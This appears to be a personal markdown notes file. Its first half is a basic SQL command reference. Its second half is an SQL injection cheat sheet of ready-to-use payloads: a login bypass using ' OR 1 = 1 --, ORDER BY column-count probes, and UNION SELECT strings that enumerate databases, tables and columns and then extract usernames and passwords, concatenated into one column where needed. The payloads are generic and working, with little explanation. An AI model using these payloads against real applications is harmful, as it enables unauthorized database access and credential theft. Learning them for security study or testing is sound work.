# Common SQL Commands

### Create db

```
CREATE DATABASE mydb;
```

### Create table

```
CREATE TABLE Students (
    studentID int,
    FirstName varchar(255),
    LastName varchar(255),
    UniversityName varchar(255)
);

CREATE TABLE Users (
    username varchar(255),
    password varchar(255)
);
```

### Insert Info

```
INSERT INTO Students VALUES (3124, "Wilson", "Lien", "Cool University");
```

### Select Data

```
SELECT * FROM Students;
```

### Select Data With Condition

```
SELECT * FROM Students WHERE studentID=3124;
SELECT * FROM Students WHERE studentID=3124 AND FirstName="Henry";
SELECT * FROM Students WHERE studentID=3124 OR FirstName="Wilson";

```

### ORDER BY

```
SELECT * FROM Students ORDER BY studentID;
SELECT * FROM Students ORDER BY studentID DESC; -- in decending order
```

### Get All Databases

```
SELECT schema_name FROM information_schema.schemata;
```

### Get All Tables

```
SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema = 'mydb';
```

### Get All Columns

```
UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users';
```

# SQL Injection Cheat Sheat

### Log In As a Valid User

```
' OR 1 = 1 --
```

## Union attack

### Find the numbers of Columns

```
' OR 1=1 ORDER BY 1; --
' OR 1=1 ORDER BY 2; --
' OR 1=1 ORDER BY 3; --
```

### Find the name of all database

```
' UNION SELECT schema_name, NULL FROM information_schema.schemata --
```

### Find the name of all tables in the interested database

```
' UNION SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema = 'mydb' --
```

### Find the name of all columns in the interested table

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users' --
```

### Get the data in the interested table

```
' UNION SELECT username, password FROM Users --
```

### Concat multiple column data in a column (used when the columns presented are less than the amount of column you want)

```
' UNION SELECT CONCAT(username, ",", password), NULL FROM Users--
```
